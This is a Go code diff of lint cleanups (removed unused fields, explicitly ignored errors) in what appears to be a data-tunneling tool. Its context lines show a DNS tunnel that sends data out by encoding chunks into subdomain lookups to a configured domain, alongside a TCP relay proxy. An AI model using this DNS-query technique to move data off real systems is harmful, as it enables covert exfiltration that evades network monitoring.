@@ -36,8 +36,6 @@ type DNSTunnel struct {
 	domain    string
 	encoding  string
 	chunkSize int
-	running   bool
-	mu        sync.Mutex
 }
 
 // HTTPTunnel represents an HTTP-based data tunnel
@@ -46,7 +44,6 @@ type HTTPTunnel struct {
 	encoding  string
 	chunkSize int
 	delay     int
-	running   bool
 }
 
 // NewDNSTunnel creates a new DNS tunnel
@@ -129,12 +126,9 @@ func (t *DNSTunnel) SendData(data []byte) error {
 	for i, chunk := range chunks {
 		query := fmt.Sprintf("%d.%s.%s", i, chunk, t.domain)
 
-		// Perform DNS lookup
-		_, err := net.LookupHost(query)
-		if err != nil {
-			// DNS error is expected, data is in the query itself
-			// The receiving end reads queries, not responses
-		}
+		// Perform DNS lookup. The error is expected and ignored: the data is in
+		// the query itself, and the receiving end reads queries, not responses.
+		_, _ = net.LookupHost(query)
 
 		// Small delay to avoid rate limiting
 		time.Sleep(10 * time.Millisecond)
@@ -291,12 +285,12 @@ func (p *TCPProxy) handleConnection(clientConn net.Conn) {
 
 	go func() {
 		defer wg.Done()
-		io.Copy(remoteConn, clientConn)
+		_, _ = io.Copy(remoteConn, clientConn)
 	}()
 
 	go func() {
 		defer wg.Done()
-		io.Copy(clientConn, remoteConn)
+		_, _ = io.Copy(clientConn, remoteConn)
 	}()
 
 	wg.Wait()
@@ -348,9 +342,9 @@ func DecodeChunk(encoded string, encoding string) (*DataChunk, error) {
 	}
 
 	chunk := &DataChunk{}
-	fmt.Sscanf(parts[0], "%d", &chunk.Sequence)
-	fmt.Sscanf(parts[1], "%d", &chunk.Total)
-	fmt.Sscanf(parts[2], "%d", &chunk.Checksum)
+	_, _ = fmt.Sscanf(parts[0], "%d", &chunk.Sequence)
+	_, _ = fmt.Sscanf(parts[1], "%d", &chunk.Total)
+	_, _ = fmt.Sscanf(parts[2], "%d", &chunk.Checksum)
 
 	var err error
 	switch encoding {
